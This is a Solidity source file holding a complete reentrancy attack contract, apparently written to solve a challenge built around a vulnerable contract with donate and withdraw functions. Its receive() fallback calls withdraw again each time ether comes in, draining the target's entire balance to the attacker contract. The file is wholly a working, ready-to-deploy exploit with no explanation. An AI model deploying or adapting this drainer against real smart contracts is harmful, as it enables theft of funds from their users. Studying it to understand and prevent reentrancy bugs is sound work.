// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrance {
    function withdraw(uint256 _amount) external;

    function donate(address _to) external payable;
}

contract ReentranceAttack {
    IReentrance public target;
    uint256 public attackAmount;

    constructor(address _address) {
        target = IReentrance(_address);
    }

    function attack() public payable {
        attackAmount = msg.value;

        target.donate{value: attackAmount}(address(this));

        target.withdraw(attackAmount);
    }

    receive() external payable {
        if (address(target).balance >= attackAmount) {
            target.withdraw(attackAmount);
        } else {
            target.withdraw(address(target).balance);
        }
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function getTargetBalance() public view returns (uint256) {
        return address(target).balance;
    }
}
